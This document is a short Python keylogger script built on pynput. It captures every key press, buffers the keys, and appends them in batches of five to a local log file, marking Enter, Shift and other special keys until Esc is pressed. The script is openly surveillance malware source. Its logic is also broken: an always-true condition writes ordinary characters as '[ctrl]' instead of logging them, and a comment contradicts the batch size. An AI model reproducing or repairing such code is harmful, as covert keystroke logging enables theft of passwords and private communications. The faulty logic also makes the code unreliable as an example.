import pynput
from pynput.keyboard import Key, Listener

#global counter which counts how many time keys were pressed
count = 0
array = []

def key_type(key):
    global count, array
    array.append(key)
    count += 1
#count how many times the key were pressed and save it to the file after each 2nd key
    if count >= 5:
        count = 0   #reset counter of keys
        write_to_file(array)
        array = []   #reset the array

    print(key)

def write_to_file(array):
    with open("keyLogger.txt","a+") as file:
        for key in array:
            k = str(key).replace("'","")
            if 'Key.space' in k:
                file.write(" ")
            elif 'Key.enter' in k:
                file.write("\n[Enter]")
            elif 'Key.shift' in k:
                file.write("[Shift]")
            elif 'Key.backspace' in k:
                file.write("[Backspace]")
            elif 'Key.cmd' in k:
                file.write("[cmd]")
            elif 'Key.ctrl_r' or 'Key.ctrl_l' in k:
                file.write("[ctrl]")
    #if not modifier key then write the string
            elif not 'key' in k:
                file.write(str(k))

#when press the esc, leave the keylogger
def key_escape(key):
    if key == Key.esc:
        return False

with Listener(on_press = key_type, on_release = key_escape) as input_key:
    input_key.join()


